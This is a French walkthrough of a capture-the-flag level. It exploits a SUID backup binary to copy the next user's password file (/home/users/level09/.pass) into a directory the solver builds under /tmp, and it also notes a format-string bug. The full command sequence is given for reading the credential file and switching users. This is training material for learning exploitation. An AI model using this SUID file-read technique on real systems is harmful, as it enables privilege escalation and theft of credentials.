# Level 08 Walkthrough

## Vulnérabilité

Le binaire `level08` est un utilitaire de sauvegarde **SUID** (il tourne avec les droits de level09). Il :
1. Ouvre `argv[1]` en lecture (avec les droits level09)
2. Copie le contenu vers `./backups/<argv[1]>`

La faille : on peut lui faire lire n'importe quel fichier accessible à level09, y compris `/home/users/level09/.pass`. Le tout est de contrôler où la copie est écrite.

> **Note** : il existe aussi une faille format string ligne 52 (`snprintf(line + len, 0xfe - len, user)` — `user` est passé comme format au lieu de `"%s"`), mais elle n'est pas nécessaire pour l'exploit.

---

## Étape 1 : Comprendre le problème de destination

Depuis le home de level08 :

```bash
./level08 /home/users/level09/.pass
# ERROR: Failed to open ./backups//home/users/level09/.pass
```

La lecture de `/home/users/level09/.pass` réussit (le binaire tourne en level09). C'est la **destination** qui échoue : `./backups/` n'existe pas, et les sous-dossiers intermédiaires non plus.

---

## Étape 2 : Préparer l'environnement dans /tmp

On a les droits d'écriture dans `/tmp`. On y crée toute l'arborescence nécessaire :

```bash
cd /tmp
mkdir -p ./backups/home/users/level09/
```

`mkdir -p` crée toute la chaîne de dossiers d'un coup, y compris `./backups/` lui-même.

---

## Étape 3 : Lancer l'exploit

```bash
cd /tmp
/home/users/level08/level08 /home/users/level09/.pass
```

Le programme :
1. Crée `./backups/.log` → OK
2. Ouvre `/home/users/level09/.pass` en lecture → OK (droits level09)
3. Copie le contenu vers `/tmp/backups/home/users/level09/.pass` → OK

---

## Étape 4 : Lire le flag

```bash
cat /tmp/backups/home/users/level09/.pass
```

---

## Étape 5 : Passer au niveau suivant

```bash
su level09
# Colle le mot de passe récupéré
```

---

## Résumé des commandes

```bash
cd /tmp
mkdir -p ./backups/home/users/level09/
/home/users/level08/level08 /home/users/level09/.pass
cat /tmp/backups/home/users/level09/.pass
su level09
```
